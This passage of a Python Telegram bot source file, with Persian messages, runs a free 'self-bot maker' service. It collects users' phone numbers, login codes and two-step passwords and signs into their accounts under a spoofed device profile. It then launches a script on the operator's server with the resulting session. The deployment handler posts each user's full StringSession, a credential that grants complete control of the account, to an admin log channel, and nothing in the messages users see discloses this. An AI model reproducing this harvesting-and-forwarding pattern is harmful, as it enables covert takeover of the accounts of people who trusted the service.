                    return await message.reply_text(f"لینک ارائه شده مربوط به کانال وضعیت ربات ({STATUS_CHANNEL_USERNAME}) نیست. پیام‌های آموزشی باید از همین کانال باشند.")
            except Exception:
                 return await message.reply_text("کانال مشخص شده در لینک یافت نشد یا ربات در آن عضو نیست.")

        elif target.isdigit():
            msg_id = int(target)
        else:
            return await message.reply_text("لطفاً لینک پیام (مثال: `https://t.me/no1self/311`) یا شناسه پیام را وارد کنید.")

        if msg_id:
            try:
                await client.get_messages(STATUS_CHANNEL_USERNAME, msg_id) # Verify message existence
            except Exception:
                return await message.reply_text(f"پیامی با شناسه `{msg_id}` در کانال `{STATUS_CHANNEL_USERNAME}` یافت نشد یا ربات به آن دسترسی ندارد.")

            if edu_type == "run":
                save_edu_message_id(EDU_RUN_MESSAGE_ID_FILE, msg_id)
                await message.reply_text(f"شناسه پیام آموزش ران با موفقیت به `{msg_id}` تنظیم شد.")
            elif edu_type == "server":
                save_edu_message_id(EDU_SERVER_MESSAGE_ID_FILE, msg_id)
                await message.reply_text(f"شناسه پیام آموزش سرور با موفقیت به `{msg_id}` تنظیم شد.")
            logger.info(f"Owner {message.from_user.id} set education message ID for {edu_type} to {msg_id}.")
        else:
            await message.reply_text("خطا در تشخیص شناسه پیام. لطفاً دوباره تلاش کنید.")

    except Exception as e:
        logger.error(f"Error in set_education_messages for user {message.from_user.id}: {e}", exc_info=True)
        await message.reply_text(f"خطایی رخ داد! {e}")


@bot.on_message(filters.command("start") & filters.private)
async def start(client: Client, message: Message):
    """Handles the /start command, welcoming users and presenting options."""
    try:
        user_id = message.from_user.id
        logger.info(f"User {user_id} ({message.from_user.username or message.from_user.first_name}) sent /start.")

        if user_id in BANNED_USERS:
            logger.warning(f"Banned user {user_id} sent /start. Ignoring.")
            return # Silent return for banned users

        # Check channel and group membership
        try:
            channel_member = await client.get_chat_member(STATUS_CHANNEL_USERNAME, user_id)
            group_member = await client.get_chat_member(GROUP_USERNAME, user_id)
            
            # Check for banned/left/restricted status in either
            if channel_member.status in [ChatMemberStatus.BANNED, ChatMemberStatus.LEFT, ChatMemberStatus.RESTRICTED] or \
               group_member.status in [ChatMemberStatus.BANNED, ChatMemberStatus.LEFT, ChatMemberStatus.RESTRICTED]:
                logger.info(f"User {user_id} is not an active member of channel/group. Sending join message.")
                return await client.send_message(
                    message.chat.id,
                    "شما عضو کانال و گروه نیستید یا از آنها محدود شده‌اید. لطفاً ابتدا عضو شوید و سپس /start را ارسال کنید.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("عضویت در کانال", url=f"https://t.me/{STATUS_CHANNEL_USERNAME}")],
                        [InlineKeyboardButton("عضویت در گروه", url=f"https://t.me/{GROUP_USERNAME}")]
                    ])
                )
        except errors.UserNotParticipant:
            logger.info(f"User {user_id} is not a participant in channel/group. Sending join message.")
            return await client.send_message(
                message.chat.id,
                "شما عضو کانال و گروه نیستید. لطفاً ابتدا عضو شوید و سپس /start را ارسال کنید.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("عضویت در کانال", url=f"https://t.me/{STATUS_CHANNEL_USERNAME}")],
                    [InlineKeyboardButton("عضویت در گروه", url=f"https://t.me/{GROUP_USERNAME}")]
                ])
            )
        except Exception as e:
            logger.error(f"Error checking membership for user {user_id}: {e}", exc_info=True)
            return await client.send_message(message.chat.id, "خطا در بررسی عضویت شما. لطفاً بعداً دوباره امتحان کنید.")


        if not BOT_ACTIVE and user_id not in OWNER_IDS:
            logger.info(f"Bot is inactive, user {user_id} is not owner. Denying access.")
            return await message.reply_text("ربات در حال حاضر خاموش است و برای کاربران عادی در دسترس نیست.")

        kb = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("اجرای سلف", callback_data="run_self"),
                InlineKeyboardButton("قوانین", callback_data="rules")
            ],
            [
                InlineKeyboardButton("چک کردن شماره", callback_data="check_number")
            ],
            [
                InlineKeyboardButton("آموزش", callback_data="edu_main")
            ]
        ])
        await message.reply_text(
            """سلام، به ربات سلف ساز No1 Self خوش اومدی!  
  
قبل از اجرای سلف حتما قوانین را مطالعه کنید:""",
            reply_markup=kb
        )

        save_user_text(user_id, username=message.from_user.username or message.from_user.first_name)

        # Ensure no residual state for this user from a previous interrupted conversation
        if user_id in CONV:
            logger.warning(f"Found stale conversation state for user {user_id}. Cleaning up.")
            await cleanup_user_state(user_id)
            CONV_COMPLETED_EVENT.set_completed(user_id) # Signal any pending timeout task to finish

    except Exception as e:
        logger.error(f"Error in start handler for user {message.from_user.id}: {e}", exc_info=True)
        await message.reply_text("خطایی رخ داده است! لطفاً دوباره امتحان کنید.")


@bot.on_callback_query(filters.regex("rules"))
async def show_rules(client: Client, cb):
    """Displays the bot's rules to the user."""
    try:
        await cb.message.edit_text(
            """کاربر گرامی، فروش این سلف به هر صورت غیر مجاز بوده و در صورت فروش حساب شما دیلیت خواهد شد و هرگونه مشکلی که برای حساب شما رخ دهد به سلف و مالک مربوط نخواهد بود. همچنین هرگونه بی احترامی به مدیران و سازنده سلف ممنوع می‌باشد.""",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("بازگشت", callback_data="back_to_start")]
            ])
        )
        await cb.answer()
    except Exception as e:
        logger.error(f"Error in show_rules for user {cb.from_user.id}: {e}", exc_info=True)
        await cb.answer("خطایی رخ داد!", show_alert=True)

@bot.on_callback_query(filters.regex("back_to_start"))
async def back_to_start(client: Client, cb):
    """Returns the user to the main menu."""
    try:
        kb = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("اجرای سلف", callback_data="run_self"),
                InlineKeyboardButton("قوانین", callback_data="rules")
            ],
            [
                InlineKeyboardButton("چک کردن شماره", callback_data="check_number")
            ],
            [
                InlineKeyboardButton("آموزش", callback_data="edu_main")
            ]
        ])
        await cb.message.edit_text("""سلام، به ربات سلف ساز No1 Self خوش اومدی!
برای اجرای سلف روی یکی از دکمه‌های زیر کلیک کن:""",
            reply_markup=kb
        )
        await cb.answer()
    except Exception as e:
        logger.error(f"Error in back_to_start for user {cb.from_user.id}: {e}", exc_info=True)
        await cb.answer("خطایی رخ داد!", show_alert=True)

@bot.on_callback_query(filters.regex("run_self"))
async def run_self(client: Client, cb):
    """Initiates the self-bot deployment conversation flow."""
    user_id = cb.from_user.id
    chat_id = cb.message.chat.id
    logger.info(f"User {user_id} clicked 'run_self'.")

    if user_id in ACTIVE_USER_CONVERSATIONS and not ACTIVE_USER_CONVERSATIONS[user_id].done():
        logger.warning(f"User {user_id} attempted to start a new run while another is active.")
        return await cb.answer("شما در حال حاضر یک فرآیند اجرای سلف را آغاز کرده‌اید. لطفاً صبر کنید تا آن به پایان برسد یا زمان آن منقضی شود.", show_alert=True)

    # Acquire semaphore to limit concurrent local self-bot instances
    async with semaphore: # Semaphore acquisition is critical here
        try:
            # Re-check channel and group membership to ensure continuous compliance
            channel_member = await client.get_chat_member(STATUS_CHANNEL_USERNAME, user_id)
            group_member = await client.get_chat_member(GROUP_USERNAME, user_id)

            if channel_member.status in [ChatMemberStatus.BANNED, ChatMemberStatus.LEFT, ChatMemberStatus.RESTRICTED] or \
               group_member.status in [ChatMemberStatus.BANNED, ChatMemberStatus.LEFT, ChatMemberStatus.RESTRICTED]:
                return await cb.answer("شما عضو کانال و گروه نیستید یا محدود شده‌اید! لطفاً اول در آن‌ها عضو شوید.", show_alert=True)

        except UserNotParticipant:
            return await cb.answer("شما عضو کانال و گروه نیستید! لطفاً اول در آن‌ها عضو شوید.", show_alert=True)
        except Exception as e:
            logger.error(f"Error checking membership for user {user_id}: {e}", exc_info=True)
            return await cb.answer("خطا در بررسی وضعیت عضویت شما! لطفاً دوباره امتحان کنید.", show_alert=True)

        if not BOT_ACTIVE and user_id not in OWNER_IDS:
            logger.info(f"Run attempt by {user_id} denied: bot is inactive.")
            return await cb.answer("ربات خاموش است!", show_alert=True)
    
        try: # Moved inside semaphore to ensure it's always acquired before checks
            now = datetime.now(timezone("Asia/Tehran"))
            # Per-user 24-hour cooldown
            if user_id not in OWNER_IDS:
                last_ts = LAST_RUNS.get(user_id)
                if last_ts:
                    last_time = datetime.fromtimestamp(last_ts, tz=timezone("Asia/Tehran"))
                    if (now - last_time).total_seconds() < 86400: # 24 hours
                        logger.info(f"Run attempt by {user_id} denied: 24-hour cooldown active.")
                        return await cb.answer("شما امروز سلف ران کرده‌اید! لطفاً 24 ساعت صبر کنید.", show_alert=True)

            # Global remaining runs limit
            if user_id not in OWNER_IDS and REMAINING_RUNS <= 0:
                logger.info(f"Run attempt by {user_id} denied: no remaining runs.")
                return await cb.answer(
                    "در حال حاضر هیچ ران مجازی باقی نمانده است! لطفاً منتظر بمانید تا مدیران دسترسی ران بدهند.",
                    show_alert=True
                )

            try:
                await cb.message.delete()
            except Exception as e:
                logger.warning(f"Could not delete callback message for user {user_id}: {e}", exc_info=True)

            # Ensure cleanup of any previous stalled state for this user
            if user_id in CONV or user_id in ACTIVE_USER_CONVERSATIONS:
                logger.warning(f"Found stale conversation state for user {user_id} before new run. Cleaning up.")
                await cleanup_user_state(user_id)
                CONV_COMPLETED_EVENT.set_completed(user_id) # Signal any pending timeout task to finish


            CONV_COMPLETED_EVENT.reset_event(user_id)

            keyboard = ReplyKeyboardMarkup(
                [[KeyboardButton("ارسال شماره", request_contact=True)]],
                resize_keyboard=True, one_time_keyboard=True
            )

            bot_msg = await client.send_message(
                chat_id=chat_id,
                text="جهت تأیید قوانین ذکر شده در بخش قوانین، شماره خود را از طریق دکمه زیر ارسال کنید:",
                reply_markup=keyboard
            )
            CONV[user_id] = {"step": "get_number", "last_bot_msg": bot_msg.id}
            logger.info(f"User {user_id} prompted for phone number.")

            # Start the timeout manager task for this conversation
            task = asyncio.create_task(conversation_timeout_manager(user_id, chat_id, client))
            ACTIVE_USER_CONVERSATIONS[user_id] = task

            await cb.answer("فرآیند اجرای سلف آغاز شد. لطفاً به سوالات ربات پاسخ دهید.", show_alert=False)
            
        except Exception as e:
            logger.error(f"Unhandled error in run_self for user {user_id}: {e}", exc_info=True)
            await cb.answer("خطایی رخ داده است! لطفاً دوباره امتحان کنید.", show_alert=True)
            await cleanup_user_state(user_id) # Ensure cleanup on error
    # Semaphore is released here automatically by 'async with'

@bot.on_callback_query(filters.regex("check_number"))
async def check_number_start(client: Client, cb):
    """Initiates the phone number check conversation flow."""
    user_id = cb.from_user.id
    chat_id = cb.message.chat.id
    logger.info(f"User {user_id} clicked 'check_number'.")

    if user_id in ACTIVE_USER_CONVERSATIONS and not ACTIVE_USER_CONVERSATIONS[user_id].done():
        logger.warning(f"User {user_id} attempted to start check_number while another is active.")
        return await cb.answer("شما در حال حاضر یک فرآیند را آغاز کرده‌اید. لطفاً صبر کنید تا آن به پایان برسد.", show_alert=True)

    try:
        await cb.message.delete()

        if user_id in CONV or user_id in ACTIVE_USER_CONVERSATIONS:
             logger.warning(f"Found stale conversation state for user {user_id} before new check. Cleaning up.")
             await cleanup_user_state(user_id)
             CONV_COMPLETED_EVENT.set_completed(user_id)


        CONV_COMPLETED_EVENT.reset_event(user_id)

        keyboard = ReplyKeyboardMarkup([[KeyboardButton("ارسال شماره", request_contact=True)]],
                                      resize_keyboard=True, one_time_keyboard=True)
        msg = await client.send_message(chat_id,
            "با استفاده از دکمه زیر شماره خود را ارسال کنید:",
            reply_markup=keyboard)
        CONV[user_id] = {"step": "check_number", "last_bot_msg": msg.id}
        logger.info(f"User {user_id} prompted for number check.")

        task = asyncio.create_task(conversation_timeout_manager(user_id, chat_id, client))
        ACTIVE_USER_CONVERSATIONS[user_id] = task

        await cb.answer("فرآیند بررسی شماره آغاز شد.", show_alert=False)
    except Exception as e:
        logger.error(f"Error in check_number_start for user {user_id}: {e}", exc_info=True)
        await cb.answer("خطایی رخ داد! لطفاً دوباره امتحان کنید.", show_alert=True)
        await cleanup_user_state(user_id)

@bot.on_callback_query(filters.regex("edu_main"))
async def edu_main_menu(client: Client, cb):
    """Displays the main education menu."""
    try:
        await cb.message.edit_text(
            "لطفاً یکی از موارد زیر را برای آموزش انتخاب کنید:",
            reply_markup=InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("آموزش ران", callback_data="edu_run"),
                    InlineKeyboardButton("آموزش سرور", callback_data="edu_server")
                ],
                [
                    InlineKeyboardButton("بازگشت", callback_data="back_to_start")
                ]
            ])
        )
        await cb.answer()
    except Exception as e:
        logger.error(f"Error in edu_main_menu for user {cb.from_user.id}: {e}", exc_info=True)
        await cb.answer("خطایی رخ داد!", show_alert=True)

@bot.on_callback_query(filters.regex("edu_run"))
async def edu_run(client: Client, cb):
    """Forwards the 'run' education message from the status channel."""
    try:
        await cb.message.delete()
        if not EDU_RUN_MESSAGE_ID:
            logger.warning(f"EDU_RUN_MESSAGE_ID not set for user {cb.from_user.id}.")
            return await cb.answer("پیام آموزشی برای 'ران' هنوز تنظیم نشده است.", show_alert=True)

        await client.copy_message(
            chat_id=cb.message.chat.id,
            from_chat_id=STATUS_CHANNEL_USERNAME,
            message_id=EDU_RUN_MESSAGE_ID
        )
        await cb.answer()
    except Exception as e:
        logger.error(f"Error in edu_run for user {cb.from_user.id}: {e}", exc_info=True)
        await cb.answer("خطا در بارگیری آموزش!", show_alert=True)

@bot.on_callback_query(filters.regex("edu_server"))
async def edu_server(client: Client, cb):
    """Forwards the 'server' education message from the status channel."""
    try:
        await cb.message.delete()
        if not EDU_SERVER_MESSAGE_ID:
            logger.warning(f"EDU_SERVER_MESSAGE_ID not set for user {cb.from_user.id}.")
            return await cb.answer("پیام آموزشی برای 'سرور' هنوز تنظیم نشده است.", show_alert=True)

        await client.copy_message(
            chat_id=cb.message.chat.id,
            from_chat_id=STATUS_CHANNEL_USERNAME,
            message_id=EDU_SERVER_MESSAGE_ID
        )
        await cb.answer()
    except Exception as e:
        logger.error(f"Error in edu_server for user {cb.from_user.id}: {e}", exc_info=True)
        await cb.answer("خطا در بارگیری آموزش!", show_alert=True)

@bot.on_message(filters.private & ~filters.command([
    "start", "ban", "unban", "bot", "setruns", "runs", "allowed",
    "bannumber", "unbannumber", "setlogchannel", "setstatusmsg", "setedumsg"
])) # Updated command list
async def conversation_handler(client: Client, message: Message):
    """Handles multi-step conversations for self-bot deployment and number checking."""
    user_id = message.from_user.id
    chat_id = message.chat.id
    logger.debug(f"Received message from user {user_id} in conversation handler. Text: '{message.text}'")

    if user_id not in CONV or user_id not in ACTIVE_USER_CONVERSATIONS or ACTIVE_USER_CONVERSATIONS[user_id].done():
        logger.warning(f"User {user_id} sent message while not in active conversation. Ignoring. CONV_state={user_id in CONV}, ACTIVE_TASK_STATE={ACTIVE_USER_CONVERSATIONS[user_id].done() if user_id in ACTIVE_USER_CONVERSATIONS else 'N/A'}")
        return await message.reply_text("لطفاً برای شروع کار با ربات از دستور /start استفاده کنید.")

    current_step = CONV[user_id].get("step")
    if not current_step:
        logger.error(f"No current step found for user {user_id} in CONV. Cleaning up.", exc_info=True)
        await message.reply_text("خطایی در وضعیت مکالمه شما رخ داده است. لطفاً /start را ارسال کنید.")
        await cleanup_user_state(user_id)
        CONV_COMPLETED_EVENT.set_completed(user_id)
        return

    try:
        # Delete user's message and bot's last message in the conversation for cleanliness
        try:
            await message.delete()
            if "last_bot_msg" in CONV[user_id]:
                await client.delete_messages(chat_id=chat_id, message_ids=CONV[user_id]["last_bot_msg"])
        except Exception as e:
            logger.warning(f"Could not delete message(s) for user {user_id}: {e}", exc_info=True)

        if current_step == "check_number":
            if not message.contact or not message.contact.phone_number:
                bot_msg = await message.reply_text("لطفاً فقط با استفاده از دکمه ارسال شماره، شماره خود را ارسال کنید.")
                CONV[user_id]["last_bot_msg"] = bot_msg.id
                return

            number = message.contact.phone_number.replace("+", "").replace(" ", "").strip()
            save_user_text(user_id, username=message.from_user.username, phone=number)
            logger.info(f"User {user_id} submitted phone {number} for check.")

            status_message = ""
            if any(number == b.strip().replace("+", "").replace(" ", "") for b in BANNED_NUMBERS):
                status_message = "شماره شما بن شده است!"
                logger.info(f"Phone number {number} for user {user_id} is banned.")
            elif user_id in OWNER_IDS: # Admin check, no longer relies on ADNUMBER
                status_message = "شما ادمین هستید!"
            else:
                status_message = "شما مجاز به استفاده از سلف ساز هستید!"
                logger.info(f"Phone number {number} for user {user_id} is free to use.")

            await client.send_message(chat_id=user_id, text=status_message)
            CONV_COMPLETED_EVENT.set_completed(user_id)
            await cleanup_user_state(user_id)
            return

        if current_step == "get_number":
            phone_number_raw = None
            if message.contact and message.contact.phone_number:
                phone_number_raw = message.contact.phone_number
            elif user_id in OWNER_IDS and message.text and message.text.strip().isdigit():
                phone_number_raw = message.text.strip() # Owners can type phone
            else:
                bot_msg = await message.reply_text("لطفاً فقط با استفاده از دکمه 'ارسال شماره' شماره خود را ارسال کنید.")
                CONV[user_id]["last_bot_msg"] = bot_msg.id
                return

            number = phone_number_raw.replace("+", "").strip()
            if not number.isdigit():
                bot_msg = await message.reply_text("شماره تلفن نامعتبر است. لطفاً یک شماره معتبر ارسال کنید.")
                CONV[user_id]["last_bot_msg"] = bot_msg.id
                return

            # Keep country code check as per original logic if needed
            if user_id not in OWNER_IDS and (number.startswith("93") or number.startswith("972")):
                logger.warning(f"User {user_id} tried to register with unsupported country code: {number}")
                await message.reply_text(
                    '''شماره تلفن کشور شما مجاز نیست!
                    
                    سازنده:
                    @CodeAlfred'''
                )
                CONV_COMPLETED_EVENT.set_completed(user_id)
                await cleanup_user_state(user_id)
                return

            if number in BANNED_NUMBERS:
                logger.warning(f"User {user_id} tried to register with banned phone number: {number}")
                await message.reply_text(
                    '''شما بن شده‌اید! برای حل مشکل به پشتیبانی مراجعه کنید.'''
                )
                CONV_COMPLETED_EVENT.set_completed(user_id)
                await cleanup_user_state(user_id)
                return

            os.makedirs("sessions", exist_ok=True)
            session_path_prefix = os.path.join("sessions", f"user_{user_id}")
            
            # Ensure any previous session files for this user are removed before starting a new one
            for file_ext in [".session", ".session-journal"]:
                f_path = session_path_prefix + file_ext
                if os.path.exists(f_path):
                    try:
                        os.remove(f_path)
                        logger.debug(f"Removed old session file: {f_path}")
                    except Exception as e:
                        logger.error(f"Error removing old session file {f_path}: {e}", exc_info=True)

            tele_client = TelegramClient(
                session=session_path_prefix,
                api_id=API_ID,
                api_hash=API_HASH,
                device_model="Samsung Galaxy A52",
                system_version="Android 13",
                app_version="11.13.2 (6060)",
                lang_code="en"
            )
            await tele_client.connect()
            logger.info(f"Telethon client connected for user {user_id}.")

            CONV[user_id].update({"number": number, "session_path_prefix": session_path_prefix, "client": tele_client})
            save_user_text(user_id, phone=number)

            try:
                # Use sign_in(phone=...) directly if Telethon supports it for initial code request
                # Or use send_code_request as you did:
                sent = await tele_client.send_code_request(number)
                CONV[user_id].update({
                    "sent_code": sent,
                    "step": "get_code"
                })
                enter_code_msg = await message.reply_text("کد دریافتی را به صورت اعداد فارسی یا انگلیسی وارد کنید:")
                CONV[user_id]["last_bot_msg"] = enter_code_msg.id
                logger.info(f"User {user_id} prompted for login code.")
            except Exception as e:
                logger.error(f"Error sending code request for user {user_id}, number {number}: {e}", exc_info=True)
                await message.reply_text(
                    "خطا در ارسال کد! شماره تلفن شما محدودیت زمانی خورده است یا از تلگرام مسدود شده است. لطفاً آن را بررسی کنید و /start را ارسال کنید."
                )
                await cleanup_user_state(user_id)
                CONV_COMPLETED_EVENT.set_completed(user_id)
                return

        elif current_step == "get_code":
            persian_digits = "۰۱۲۳۴۵۶۷۸۹"
            english_digits = "0123456789"
            code = message.text.strip().translate(str.maketrans(persian_digits, english_digits))
            
            if not code.isdigit() or len(code) not in [5, 6]:
                bot_msg = await message.reply_text("کد وارد شده نامعتبر است. لطفاً کد را به صورت عددی و صحیح وارد کنید.")
                CONV[user_id]["last_bot_msg"] = bot_msg.id
                return

            tele_client = CONV[user_id]["client"]
            
            try:
                await tele_client.sign_in(
                    phone=CONV[user_id]["number"],
                    code=code
                )
                logger.info(f"User {user_id} successfully signed in with code.")
                await handle_local_self_bot_deployment(client, message, user_id, chat_id, tele_client)
            except SessionPasswordNeededError:
                logger.info(f"User {user_id} requires 2FA password.")
                twofa_msg = await message.reply_text("رمز دو مرحله‌ای را وارد کنید:")
                CONV[user_id].update({
                    "step": "get_2fa",
                    "last_bot_msg": twofa_msg.id
                })
            except Exception as e:
                logger.error(f"Error during sign-in with code for user {user_id}: {e}", exc_info=True)
                await message.reply_text(
                    "کد ورود اشتباه است یا منقضی شده است! لطفاً /start را ارسال کنید و دوباره امتحان کنید."
                )
                await cleanup_user_state(user_id)
                CONV_COMPLETED_EVENT.set_completed(user_id)
                return

        elif current_step == "get_2fa":
            password = message.text.strip()
            tele_client = CONV[user_id]["client"]

            try:
                await tele_client.sign_in(password=password)
                # CONV[user_id]["two_step"] = password # SECURITY ALERT: DO NOT store or log sensitive password
                logger.info(f"User {user_id} successfully signed in with 2FA password.")
                await handle_local_self_bot_deployment(client, message, user_id, chat_id, tele_client)
            except Exception as e:
                logger.error(f"Error during sign-in with 2FA password for user {user_id}: {e}", exc_info=True)
                await message.reply_text(
                   "رمز دومرحله ای اشتباه است! لطفاً /start را ارسال کنید و دوباره امتحان کنید."
               )
                await cleanup_user_state(user_id)
                CONV_COMPLETED_EVENT.set_completed(user_id)
                return

    except Exception as e:
        logger.error(f"Unhandled error in conversation_handler for user {user_id} at step {current_step}: {e}", exc_info=True)
        error_msg = "خطایی غیرمنتظره رخ داد! لطفاً /start را ارسال کنید و دوباره امتحان کنید."
        if user_id in CONV and CONV[user_id].get("last_bot_msg"):
            try:
                await client.edit_message_text(chat_id, CONV[user_id]["last_bot_msg"], error_msg)
            except Exception as edit_error:
                logger.error(f"Error editing error message for user {user_id}: {edit_error}", exc_info=True)
                await message.reply_text(error_msg)
        else:
            await message.reply_text(error_msg)
        CONV_COMPLETED_EVENT.set_completed(user_id)
        await cleanup_user_state(user_id)


async def handle_local_self_bot_deployment(pyrogram_client: Client, message: Message, user_id: int, chat_id: int, tele_client: TelegramClient):
    """
    Handles the deployment of the self-bot locally on the host server
    after successful Telethon login.
    """
    wait_msg = await pyrogram_client.send_message(chat_id, """در حال آماده‌سازی و اجرای سلف، لطفاً صبر کنید!
این فرآیند ممکن است چند ثانیه طول بکشد.""")
    logger.info(f"User {user_id} started local self-bot deployment.")

    try:
        if not os.path.exists(LOCAL_SELF_BOT_TEMPLATE_PATH):
            logger.error("Self-bot template script not found. Attempting to re-download.")
            await download_self_bot_script()
            if not os.path.exists(LOCAL_SELF_BOT_TEMPLATE_PATH):
                raise FileNotFoundError(f"Self-bot template script not found at {LOCAL_SELF_BOT_TEMPLATE_PATH}")

        user_self_bot_dir = os.path.join("selfbot_instances", str(user_id))
        os.makedirs(user_self_bot_dir, exist_ok=True)
        
        shutil.copy(LOCAL_SELF_BOT_TEMPLATE_PATH, os.path.join(user_self_bot_dir, "self.py"))
        logger.info(f"Copied self.py to {user_self_bot_dir} for user {user_id}.")

        string_session = StringSession.save(tele_client.session)
        CONV[user_id]["string"] = string_session # Store for admin log
        logger.info(f"Generated StringSession for user {user_id}.")

        env_vars = os.environ.copy()
        env_vars['API_ID'] = str(API_ID)
        env_vars['API_HASH'] = API_HASH
        env_vars['STRING_SESSION'] = string_session
        env_vars['PYTHONUNBUFFERED'] = '1'

        user_log_file = os.path.join(user_self_bot_dir, f"{user_id}.log")

        with open(user_log_file, "a", encoding="utf-8") as outfile:
            process = await asyncio.create_subprocess_exec(
                "nohup",
                "python3",
                "self.py",
                stdout=outfile,
                stderr=outfile,
                cwd=user_self_bot_dir,
                env=env_vars,
                start_new_session=True
            )
        CONV[user_id]["self_bot_process"] = process
        logger.info(f"Self-bot for user {user_id} launched as PID {process.pid} in {user_self_bot_dir}.")

        # Perform cleanup immediately after launching the process, before sending final messages
        # This ensures session files and Telethon client are handled even if subsequent steps fail
        await cleanup_user_state(user_id) 

        if user_id not in OWNER_IDS:
            if REMAINING_RUNS > 0:
                save_remaining_runs(REMAINING_RUNS - 1) # Decrement and save
                logger.info(f"REMAINING_RUNS decremented to {REMAINING_RUNS} for user {user_id}.")
            
            LAST_RUNS[user_id] = time.time()
            save_last_runs()
            logger.info(f"User {user_id} added to 24-hour cooldown.")

        await wait_msg.delete()

        await pyrogram_client.send_message(
            chat_id=chat_id,
            text="""سلف با موفقیت روی سرور ما اجرا شد، با دستور `راهنما` منوی راهنمای سلف را باز کنید.

فروش این سلف ممنوع است!
@No1Self
سلف ساز رایگان:
@No1SelfBot"""
        )
        logger.info(f"Selfbot successfully deployed for user {user_id}.")

        # Send log to admin channel (sensitive data logging is still a risk)
        if ADMIN_LOG_CHANNEL_ID:
            username_or_mention = f"@{message.from_user.username}" if message.from_user.username else f"[{message.from_user.first_name}](tg://user?id={user_id})"
            # Two-step password is now NOT logged. StringSession can be dangerous but is often requested for recovery.
            
            # Mask phone number in logs for better privacy/security if needed
            masked_phone = CONV[user_id]['number'][:3] + 'xxxx' + CONV[user_id]['number'][-4:]

            info = (
                f"**New No1 Self Run! (Local Deployment)**\n"
                f"**User:** {username_or_mention}\n"
                f"**User ID:** `{user_id}`\n"
                f"**Number:** `+{masked_phone}`\n"
                f"**StringSession (CAUTION: SENSITIVE!):** `{CONV[user_id]['string']}`\n" 
                f"**Self-bot PID:** `{process.pid}`\n"
                f"**Self-bot Dir:** `{user_self_bot_dir}`\n"
                f"**Remaining Global Runs:** `{REMAINING_RUNS}`"
            )

            try:
                await pyrogram_client.send_message(ADMIN_LOG_CHANNEL_ID, info, disable_web_page_preview=True)
                logger.info(f"Admin log sent for user {user_id}.")
            except Exception as e:
                logger.error(f"Error sending admin log message for user {user_id}: {e}", exc_info=True)
        else:
            logger.warning(f"ADMIN_LOG_CHANNEL_ID not set. Could not send deployment log for user {user_id}.")

        CONV_COMPLETED_EVENT.set_completed(user_id)
        
    except Exception as e:
        logger.error(f"Local self-bot deployment error for user {user_id}: {e}", exc_info=True)
        error_message_to_user = "خطا در اجرای سلف! لطفاً دوباره امتحان کنید. برای شروع دوباره /start را ارسال کنید."
        if wait_msg:
            try:
                await wait_msg.edit_text(error_message_to_user)
            except Exception as edit_error:
                logger.error(f"Error editing error message for user {user_id}: {edit_error}", exc_info=True)
                await pyrogram_client.send_message(chat_id=chat_id, text=error_message_to_user)
        else:
            await pyrogram_client.send_message(chat_id=chat_id, text=error_message_to_user)
        
        # Ensure cleanup on error, even if it happens after initial cleanup_user_state call
        await cleanup_user_state(user_id) 
        CONV_COMPLETED_EVENT.set_completed(user_id)


async def channel_message_updater():
    """Periodically updates the status message in the public channel."""
    last_minute_update = None
    last_run_count_update = REMAINING_RUNS
    while True:
        try:
            now = datetime.now(timezone("Asia/Tehran"))
            current_minute = now.strftime('%H:%M')
            load_remaining_runs() # Reload to ensure global REMAINING_RUNS is up-to-date

            if current_minute != last_minute_update or REMAINING_RUNS != last_run_count_update:
                last_minute_update = current_minute
                last_run_count_update = REMAINING_RUNS
                await update_channel_message()
        except Exception as e:
            logger.error(f"Error in channel_message_updater: {e}", exc_info=True)
        await asyncio.sleep(5)

if __name__ == "__main__":
    logger.info("Starting No1 Self Bot...")
    asyncio.run(download_self_bot_script())

    while True:
        try:
            bot.run() # Use bot.run() for Pyrogram clients in blocking mode
            logger.info("Bot client started and finished running.") # This line usually not reached with idle() or run()
        except Exception as e:
            logger.critical(f"Bot experienced a critical error: {e}", exc_info=True)
            logger.info("Attempting to restart bot in 10 seconds...")
            time.sleep(10)
        finally:
            try:
                # Ensure background tasks are properly cancelled if loop is stopping
                # For `bot.run()`, Pyrogram handles event loop, `idle()` is often preferred for more control
                # If using `idle()`, tasks can be managed with `asyncio.gather` or similar before `idle()`
                # For simplicity here, if `bot.run()` exits, tasks will restart with the bot.
                pass # Pyrogram's `run()` is blocking and handles internal loop
            except Exception as e:
                logger.warning(f"Error during final cleanup: {e}", exc_info=True)
    logger.critical("Bot process exited unexpectedly from main loop.")
